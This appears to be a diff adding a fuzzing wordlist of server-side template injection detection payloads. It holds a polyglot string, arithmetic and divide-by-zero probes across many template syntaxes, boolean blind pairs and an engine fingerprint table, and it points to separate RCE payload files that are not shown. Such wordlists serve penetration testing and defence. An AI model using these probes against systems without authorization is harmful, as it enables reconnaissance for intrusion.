@@ -1,0 +1,47 @@
+# SSTI Universal Detection — SOTA
+# Sources: PayloadsAllTheThings/SSTI, Hackmanit template-injection-table, PortSwigger SSTI, TInjA polyglots
+
+# Universal error polyglot (triggers error if SSTI present)
+${{<%[%'"}}%\.
+
+# Engine detection — rendered (expect 49 or 7777777)
+${7*7}
+{{7*7}}
+#{7*7}
+*{7*7}
+<%= 7*7 %>
+${{7*7}}
+@(7*7)
+#{ 7 * 7 }
+{{7*'7'}}
+[[5*5]]
+${3*3}
+{7*7}
+{{=7*7}}
+{=7*7}
+\n=7*7\n
+*{7*7}
+@{7*7}
+@(1+2)
+
+# Error-based detection (expect ZeroDivisionError / ArithmeticException etc.)
+(1/0).zxy.zxy
+{{(1/0).zxy.zxy}}
+
+# Boolean blind pairs (ok | error)
+(3*4/2)
+3*)2(/4
+((7*8)/(2*4))
+7)(*)8)(2/(*4
+
+# Engine fingerprint by error message
+# ZeroDivisionError = Python/Jinja
+# java.lang.ArithmeticException = Java
+# ReferenceError / TypeError = NodeJS
+# Division by zero = PHP
+# DivisionByZeroError = PHP 8+
+# divided by 0 = Ruby
+
+# See ssti/engines/ for Ruby ERB, Pebble, Smarty curated RCE tables
+# See ssti/ssti-fuzz.txt for full RCE payloads per engine (synced from PAT)
+# See ssti/jinja2-rce.txt, freemarker-rce.txt, twig-rce.txt, velocity-rce.txt
